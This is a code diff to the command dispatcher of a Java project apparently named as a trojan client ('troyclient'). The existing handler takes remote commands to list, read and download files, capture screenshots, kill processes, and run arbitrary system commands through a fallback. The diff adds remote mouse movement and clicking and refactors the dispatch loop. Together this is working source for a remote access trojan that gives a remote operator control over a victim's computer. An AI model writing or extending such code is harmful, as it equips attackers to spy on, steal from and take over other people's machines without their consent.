@@ -8,6 +8,8 @@ import ch.lebois.troyclient.service.DownloadService;
 import ch.lebois.troyclient.service.FileService;
 import ch.lebois.troyclient.service.ImageSender;
 import ch.lebois.troyclient.service.ListFiles;
+import ch.lebois.troyclient.service.Mouse;
+import java.util.ArrayList;
 
 /**
  * @author Felix
@@ -17,6 +19,8 @@ import ch.lebois.troyclient.service.ListFiles;
  * Package: ch.lebois.troyclient.main
  **/
 public class CommandList {
+
+    private ArrayList<Command> commands;
 
     private Command message = new Command("msg") {
         @Override
@@ -73,25 +77,45 @@ public class CommandList {
         }
     };
 
+    private Command mouseMove = new Command("mousemove") {
+        @Override
+        public void run(String command) {
+            Mouse mouse = new Mouse();
+            mouse.moveMouse(command);
+            GetContext.SENDER.send("commandout", "Mouse moved to " + mouse.getX() + " " + mouse.getY());
+        }
+    };
+
+    private Command mouseClick = new Command("mouseclick") {
+        @Override
+        public void run(String command) {
+            new Mouse().mouseClick();
+            GetContext.SENDER.send("commandout", "Mouse clicked");
+        }
+    };
+
 
     public void readCommand(String command) {
-        if (command.startsWith(message.getCommand())) {
-            message.run(command);
-        } else if (command.startsWith(ls.getCommand())) {
-            ls.run(command);
-        } else if (command.startsWith(read.getCommand())) {
-            read.run(command);
-        } else if (command.startsWith(download.getCommand())) {
-            download.run(command);
-        } else if (command.startsWith(desktop.getCommand())) {
-            desktop.run(command);
-        } else if (command.startsWith(kill.getCommand())) {
-            kill.run(command);
-        } else if (command.startsWith(screenshot.getCommand())) {
-            screenshot.run(command);
-        } else {
-            executeNormalCommand(command);
+        commands = new ArrayList<>();
+
+        commands.add(message);
+        commands.add(ls);
+        commands.add(read);
+        commands.add(download);
+        commands.add(desktop);
+        commands.add(kill);
+        commands.add(screenshot);
+        commands.add(mouseMove);
+        commands.add(mouseClick);
+
+
+        for (Command commandElem : commands) {
+            if (command.startsWith(commandElem.getCommand())) {
+                commandElem.run(command);
+                return;
+            }
         }
+        executeNormalCommand(command);
     }
 
     private void executeNormalCommand(String command) {
